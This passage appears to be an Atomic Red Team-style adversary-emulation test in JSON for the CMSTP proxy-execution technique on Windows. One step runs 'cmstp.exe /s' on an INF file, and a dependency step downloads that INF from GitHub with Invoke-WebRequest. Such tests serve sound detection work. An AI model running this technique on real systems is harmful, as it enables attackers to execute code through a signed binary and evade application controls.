{
  "id": "34e63321-9683-496b-bbc1-7566bc55e624",
  "name": "CMSTP Executing Remote Scriptlet",
  "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "a86d4be5-54b1-4f01-90ac-a78104db2ea4",
      "type": "execute-command",
      "data": {
        "command": "cmstp.exe /s \"#{inf_file_path}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "d007ed70-6c6c-4666-a780-34e1f1661288",
      "name": "Check dependency 1/1",
      "description": "INF file must exist on disk at specified location (#{inf_file_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{inf_file_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "f9382284-c71c-4ad4-bef5-2fa7f42b63da",
      "name": "Resolve dependency 1/1",
      "description": "INF file must exist on disk at specified location (#{inf_file_path})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{inf_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003.inf\" -OutFile \"#{inf_file_path}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "4ef022aa-0dd1-40e6-b8c0-8dbcafd05c5b",
      "name": "Re-check dependency 1/1",
      "description": "INF file must exist on disk at specified location (#{inf_file_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{inf_file_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
